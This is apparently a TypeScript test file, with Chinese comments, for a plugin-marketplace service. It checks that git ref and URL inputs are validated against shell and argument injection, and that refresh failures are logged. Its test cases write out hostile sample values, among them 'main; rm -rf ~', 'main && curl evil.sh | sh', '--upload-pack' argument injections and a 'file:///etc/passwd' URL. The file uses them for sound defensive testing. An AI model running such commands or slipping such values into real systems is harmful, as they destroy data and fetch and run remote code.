/**
 * zx_20260930 M15-③：插件市场「外源」的校验 / argv 构造 / 失败账。
 *
 * 病根：`source_ref` / `source_url` 来自请求体，此前**零校验**就被模板串拼进 shell ——
 *   `git fetch origin && git reset --hard origin/${sourceRef}`、`git clone … ${sourceUrl} …`
 *   ⇒ `source_ref = "main; rm -rf ~"` 会被 `/bin/sh` 当命令执行。
 *
 * 收口的两面（本文件两侧都判）：
 *   ① **值的合法域**判死（`validateMarketplaceSource`）——`;`/`&&`/`-` 开头/`..` 一律不合法；
 *   ② **命令不走 shell**（`gitRefreshSteps` 产 `string[]`）——注入面在结构上消失。
 *      故本文件对 argv **逐元素**断言：没有一个元素含 shell 元字符（这才是"结构上消失"的证据，
 *      "值校验通过"只证了①）。
 *   ③ **失败要有账**：`recordMarketplaceRefreshError` 写 `last_error`/`last_error_at`，
 *      成功则 `recordMarketplaceRefreshOk` 清掉旧错（否则界面一直显示已修好的旧错）。
 */
import { describe, it, expect, beforeAll } from 'vitest';
import { Elysia } from 'elysia';
import Database from 'better-sqlite3';
import {
  MARKETPLACE_SOURCE_TYPES,
  isMarketplaceSourceType,
  validateMarketplaceSource,
  gitRefreshSteps,
  recordMarketplaceRefreshError,
  recordMarketplaceRefreshOk,
} from '../services/marketplace-source.js';
import { pluginMarketplaceRoutes, refreshAllMarketplaces } from '../routes/plugin-marketplace.js';
import { handleRouteError } from '../utils/error-handler.js';

/** shell 元字符（若 argv 里出现任何一个，就说明"值还是 shell 片段"）。 */
const SHELL_METACHARS = [';', '&&', '|', '`', '$', '>', '<', '\n', ' '];

function makeDb(): Database.Database {
  const db = new Database(':memory:');
  db.exec(`
    CREATE TABLE ans_plugin_marketplaces (id TEXT PRIMARY KEY, name TEXT UNIQUE NOT NULL, source_type TEXT NOT NULL, source_url TEXT NOT NULL, source_ref TEXT DEFAULT 'main', status TEXT DEFAULT 'active', auto_refresh INTEGER DEFAULT 1, last_refresh_at TEXT, created_at TEXT DEFAULT (datetime('now')), last_error TEXT DEFAULT '', last_error_at TEXT DEFAULT '');
    CREATE TABLE ans_plugins (id TEXT PRIMARY KEY, marketplace_id TEXT, name TEXT NOT NULL, version TEXT DEFAULT '0.1.0', display_name TEXT, description TEXT, description_zh TEXT, author TEXT, language TEXT DEFAULT 'zh', category TEXT, tags TEXT DEFAULT '[]', source_path TEXT, state TEXT DEFAULT 'available', installed_version TEXT, installed_at TEXT, user_config TEXT DEFAULT '{}', stars REAL DEFAULT 0, install_count INTEGER DEFAULT 0, status TEXT DEFAULT 'active', created_at TEXT DEFAULT (datetime('now')), enabled INTEGER DEFAULT 1);
    CREATE TABLE ans_plugin_registrations (id TEXT PRIMARY KEY, plugin_id TEXT, resource_type TEXT NOT NULL, ans_resource_id TEXT NOT NULL, created_at TEXT DEFAULT (datetime('now')));
  `);
  return db;
}

const row = (db: Database.Database, id: string) =>
  db.prepare('SELECT last_error, last_error_at, last_refresh_at FROM ans_plugin_marketplaces WHERE id = ?').get(id) as {
    last_error: string;
    last_error_at: string;
    last_refresh_at: string | null;
  };

describe('M15-③ validateMarketplaceSource（纯函数：两侧标本）', () => {
  it('四值白名单齐（实测：git 路只筛 github|gitee，适配器路另有 url|github-topics）', () => {
    expect([...MARKETPLACE_SOURCE_TYPES].sort()).toEqual(['gitee', 'github', 'github-topics', 'url']);
    expect(isMarketplaceSourceType('github')).toBe(true);
    expect(isMarketplaceSourceType('gitlab')).toBe(false);
    expect(isMarketplaceSourceType(null)).toBe(false);
  });

  it('合法三元组收下；ref 缺省取 main', () => {
    const ok = validateMarketplaceSource({
      source_type: 'github',
      source_url: 'https://github.com/a/b',
      source_ref: 'v1.2.3',
    });
    expect(ok).toEqual({
      ok: true,
      value: { source_type: 'github', source_url: 'https://github.com/a/b', source_ref: 'v1.2.3' },
    });
    const dflt = validateMarketplaceSource({ source_type: 'github', source_url: 'https://github.com/a/b' });
    expect(dflt.ok && dflt.value.source_ref).toBe('main');
    const blank = validateMarketplaceSource({
      source_type: 'github',
      source_url: 'https://github.com/a/b',
      source_ref: '   ',
    });
    expect(blank.ok && blank.value.source_ref).toBe('main');
    // 分支名/带斜杠的 ref 是合法的 git ref，别过度收紧（判据须能被合法数据满足）
    expect(
      validateMarketplaceSource({ source_type: 'github', source_url: 'https://x/y', source_ref: 'feature/a.b_c-d' }).ok,
    ).toBe(true);
  });

  it('**注入标本**一律不收：`;`、`&&`、`-` 开头、`..`', () => {
    for (const ref of [
      'main; rm -rf ~',
      'main && curl evil.sh | sh',
      '$(whoami)',
      '`id`',
      '--upload-pack=touch /tmp/pwn',
      'a..b',
      'main\nrm',
    ]) {
      const r = validateMarketplaceSource({
        source_type: 'github',
        source_url: 'https://github.com/a/b',
        source_ref: ref,
      });
      expect(r.ok).toBe(false);
    }
    // `-` 开头是**参数注入**（git 会当选项解析），第一个字符必须是字母数字
    const dash = validateMarketplaceSource({
      source_type: 'github',
      source_url: 'https://github.com/a/b',
      source_ref: '-x',
    });
    expect(dash.ok).toBe(false);
  });

  it('source_type / source_url 两侧也判', () => {
    expect(validateMarketplaceSource({ source_type: 'evil', source_url: 'https://x/y' }).ok).toBe(false);
    expect(validateMarketplaceSource({ source_type: 'github', source_url: 'file:///etc/passwd' }).ok).toBe(false);
    expect(validateMarketplaceSource({ source_type: 'github', source_url: 'https://x/y z' }).ok).toBe(false); // 含空白
    expect(validateMarketplaceSource({ source_type: 'github', source_url: '' }).ok).toBe(false);
  });
});

describe('M15-③ gitRefreshSteps（argv 构造：**逐元素**证明不走 shell）', () => {
  const input = { sourceRef: 'main', sourceUrl: 'https://github.com/a/b', cachePath: '/tmp/cache/demo' };

  it('已缓存 ⇒ fetch + reset --hard origin/<ref>（两条独立 argv）', () => {
    expect(gitRefreshSteps({ ...input, exists: true })).toEqual([
      ['-C', '/tmp/cache/demo', 'fetch', 'origin'],
      ['-C', '/tmp/cache/demo', 'reset', '--hard', 'origin/main'],
    ]);
  });

  it('未缓存 ⇒ clone --depth 1 --branch <ref> <url> <path>', () => {
    expect(gitRefreshSteps({ ...input, exists: false })).toEqual([
      ['clone', '--depth', '1', '--branch', 'main', 'https://github.com/a/b', '/tmp/cache/demo'],
    ]);
  });

  it('每个 argv 元素都不含 shell 元字符（"结构上消失"的证据，不只是"值校验通过"）', () => {
    for (const exists of [true, false]) {
      for (const argv of gitRefreshSteps({ ...input, exists })) {
        for (const el of argv) {
          for (const m of SHELL_METACHARS) expect(el).not.toContain(m);
        }
      }
    }
  });
});

describe('M15-③ 失败账（0→1 正面断言，且成功清旧错）', () => {
  it('记失败：last_error / last_error_at 从空变非空', () => {
    const db = makeDb();
    db.prepare(
      "INSERT INTO ans_plugin_marketplaces (id, name, source_type, source_url) VALUES ('mk1', 'demo', 'github', 'https://github.com/a/b')",
    ).run();
    const before = row(db, 'mk1');
    expect(before.last_error).toBe(''); // 正面：起始确为空（不是"没查"）
    expect(before.last_error_at).toBe('');
    recordMarketplaceRefreshError(db, 'mk1', 'git clone failed: repository not found');
    const after = row(db, 'mk1');
    expect(after.last_error).toContain('repository not found');
    expect(after.last_error_at).not.toBe('');
  });

  it('记成功：写 last_refresh_at 并**清掉**上一轮的失败因', () => {
    const db = makeDb();
    db.prepare(
      "INSERT INTO ans_plugin_marketplaces (id, name, source_type, source_url) VALUES ('mk1', 'demo', 'github', 'https://github.com/a/b')",
    ).run();
    recordMarketplaceRefreshError(db, 'mk1', 'boom');
    expect(row(db, 'mk1').last_error).toBe('boom');
    recordMarketplaceRefreshOk(db, 'mk1');
    const after = row(db, 'mk1');
    expect(after.last_error).toBe('');
    expect(after.last_refresh_at).not.toBeNull();
  });

  it('超长因被截断（不把整页堆栈塞进一列）', () => {
    const db = makeDb();
    db.prepare(
      "INSERT INTO ans_plugin_marketplaces (id, name, source_type, source_url) VALUES ('mk1', 'demo', 'github', 'https://github.com/a/b')",
    ).run();
    recordMarketplaceRefreshError(db, 'mk1', 'x'.repeat(5000));
    expect(row(db, 'mk1').last_error.length).toBe(500);
  });
});

describe('M15-③ 路由：入口校验 + 刷新失败有账', () => {
  let db: Database.Database;
  let gitCalls: string[][];
  let gitMode: 'ok' | 'fail';
  // 类型由**构建表达式派生**（`models-routes.test.ts` 的成法）：`let app: Elysia` 是"裸泛型"，与带
  // 路由表的实例不同型（onStart 不兼容）⇒ 赋值处会 TS2322。
  const buildApp = (d: Database.Database) =>
    new Elysia().onError(handleRouteError).use(
      pluginMarketplaceRoutes(d, {
        cacheDir: '/tmp/m15-nonexistent-cache',
        runGit: async (argv) => {
          gitCalls.push(argv);
          if (gitMode === 'fail') throw new Error('git clone failed: authentication required');
        },
      }),
    );
  let app: ReturnType<typeof buildApp>;

  beforeAll(() => {
    db = makeDb();
    db.prepare(
      "INSERT INTO ans_plugin_marketplaces (id, name, source_type, source_url) VALUES ('mk1', 'mk1', 'github', 'https://github.com/a/b')",
    ).run();
    gitCalls = [];
    gitMode = 'ok';
    app = buildApp(db);
  });

  const mktCount = () => (db.prepare('SELECT COUNT(*) as c FROM ans_plugin_marketplaces').get() as { c: number }).c;

  const post = (path: string, body: unknown) =>
    app.handle(
      new Request(`http://localhost${path}`, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify(body),
      }),
    );

  it('POST /marketplaces 合法 → 201 并落库（行数 0→1）', async () => {
    const before = mktCount();
    const res = await post('/api/v1/plugins/marketplaces', {
      name: 'demo',
      source_type: 'github',
      source_url: 'https://github.com/a/b',
      source_ref: 'main',
    });
    expect(res.status).toBe(201);
    expect(mktCount()).toBe(before + 1);
  });

  it('POST /marketplaces 带注入 ref → 400 且**一行都不落**', async () => {
    const before = mktCount();
    const res = await post('/api/v1/plugins/marketplaces', {
      name: 'evil',
      source_type: 'github',
      source_url: 'https://github.com/a/b',
      source_ref: 'main; rm -rf ~',
    });
    expect(res.status).toBe(400);
    expect(mktCount()).toBe(before);
    expect(db.prepare("SELECT COUNT(*) as c FROM ans_plugin_marketplaces WHERE name = 'evil'").get()).toEqual({ c: 0 });
  });

  it('POST /marketplaces/:id/refresh 成功 → 200，且交给 git 的每条 argv 都是**参数**（无元字符）', async () => {
    gitCalls = [];
    gitMode = 'ok';
    const res = await post('/api/v1/plugins/marketplaces/mk1/refresh', {});
    expect(res.status).toBe(200);
    expect(gitCalls.length).toBeGreaterThan(0);
    for (const argv of gitCalls) {
      for (const el of argv) {
        for (const m of SHELL_METACHARS) expect(el).not.toContain(m);
      }
    }
    // 正面：成功账落地（last_refresh_at 从 null 变非空）
    expect(row(db, 'mk1').last_refresh_at).not.toBeNull();
    expect(row(db, 'mk1').last_error).toBe('');
  });

  it('POST /marketplaces/:id/refresh 失败 → 500 且 **last_error 从空变非空**（原来静默）', async () => {
    gitMode = 'fail';
    expect(row(db, 'mk1').last_error).toBe(''); // 正面：起始为空
    const res = await post('/api/v1/plugins/marketplaces/mk1/refresh', {});
    expect(res.status).toBe(500);
    const after = row(db, 'mk1');
    expect(after.last_error).toContain('authentication required');
    expect(after.last_error_at).not.toBe('');
    const body = (await res.json()) as { error: { code: string; message: string } };
    expect(body.error.code).toBe('REFRESH_FAILED');
    expect(body.error.message).not.toContain('authentication required'); // 细节只进账/日志，不进响应体
  });

  it('落库行带非法 ref（历史数据）时，刷新**先校验后跳过**并记账，绝不喂给 git', async () => {
    // 直插一行带非法 ref（模拟旧数据；POST 那条路已挡住）
    db.prepare(
      "INSERT INTO ans_plugin_marketplaces (id, name, source_type, source_url, source_ref) VALUES ('mk2', 'legacy', 'github', 'https://github.com/a/b', '-upload-pack=evil')",
    ).run();
    gitCalls = [];
    const res = await post('/api/v1/plugins/marketplaces/mk2/refresh', {});
    expect(res.status).toBe(400);
    expect(gitCalls.length).toBe(0); // **一条 git 都没跑**（这才是"注入面消失"）
  });

  it('refreshAllMarketplaces：runGit 抛错 ⇒ 返回 0 且该市场记了失败因（0→1）', async () => {
    const db2 = makeDb();
    db2
      .prepare(
        "INSERT INTO ans_plugin_marketplaces (id, name, source_type, source_url, auto_refresh) VALUES ('mk9', 'auto', 'github', 'https://github.com/a/b', 1)",
      )
      .run();
    const n = await refreshAllMarketplaces(db2, {
      cacheDir: '/tmp/m15-nonexistent-cache',
      runGit: async () => {
        throw new Error('network unreachable');
      },
    });
    expect(n).toBe(0); // 计数器断言：不是"没抛"就算过
    const r = db2.prepare("SELECT last_error, last_error_at FROM ans_plugin_marketplaces WHERE id = 'mk9'").get() as {
      last_error: string;
      last_error_at: string;
    };
    expect(r.last_error).toContain('network unreachable');
    expect(r.last_error_at).not.toBe('');
  });

  it('refreshAllMarketplaces：成功 ⇒ 返回 1 且 last_error 被清', async () => {
    const db2 = makeDb();
    db2
      .prepare(
        "INSERT INTO ans_plugin_marketplaces (id, name, source_type, source_url, auto_refresh) VALUES ('mk9', 'auto', 'github', 'https://github.com/a/b', 1)",
      )
      .run();
    recordMarketplaceRefreshError(db2, 'mk9', '陈旧之错');
    const n = await refreshAllMarketplaces(db2, { cacheDir: '/tmp/m15-nonexistent-cache', runGit: async () => {} });
    expect(n).toBe(1);
    const r = db2.prepare("SELECT last_error FROM ans_plugin_marketplaces WHERE id = 'mk9'").get() as {
      last_error: string;
    };
    expect(r.last_error).toBe('');
  });
});
